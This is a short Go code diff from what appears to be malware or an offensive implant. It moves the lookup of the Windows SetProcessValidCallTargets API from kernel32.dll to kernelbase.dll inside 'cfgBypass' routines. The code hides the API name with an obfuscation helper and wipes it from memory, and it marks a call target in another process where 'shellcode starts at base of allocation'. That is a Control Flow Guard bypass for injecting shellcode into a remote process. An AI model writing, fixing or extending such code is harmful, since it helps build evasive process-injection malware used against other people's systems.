@@ -38,6 +38,7 @@ type cfgCallTargetInfo struct {
 }
 
 var (
+	kernelbaseCFG                  = syscall.NewLazyDLL("kernelbase.dll")
 	procSetProcessValidCallTargets *syscall.LazyProc
 	cfgBypassAvailable             bool
 	initCFGBypassOnce              sync.Once
@@ -46,9 +47,7 @@ var (
 func ensureCFGBypassAPIs() {
 	initCFGBypassOnce.Do(func() {
 		name := obfuscate.SetProcessValidCallTargets()
-		procSetProcessValidCallTargets = kernel32.NewProc(name)
-		// Eagerly resolve before Zero wipes the name's backing bytes
-		// (LazyProc stores a reference to the same string memory).
+		procSetProcessValidCallTargets = kernelbaseCFG.NewProc(name)
 		cfgBypassAvailable = procSetProcessValidCallTargets.Find() == nil
 		obfuscate.Zero(name)
 	})
@@ -64,7 +63,7 @@ func ensureCFGBypassAPIs() {
 func cfgBypassApplyToTarget(hProcess uintptr, addr uintptr, size int) error {
 	ensureCFGBypassAPIs()
 	if !cfgBypassAvailable {
-		return fmt.Errorf("SetProcessValidCallTargets not available in kernel32.dll")
+		return fmt.Errorf("SetProcessValidCallTargets not available in kernelbase.dll")
 	}
 	target := cfgCallTargetInfo{
 		Offset: 0, // shellcode starts at base of allocation
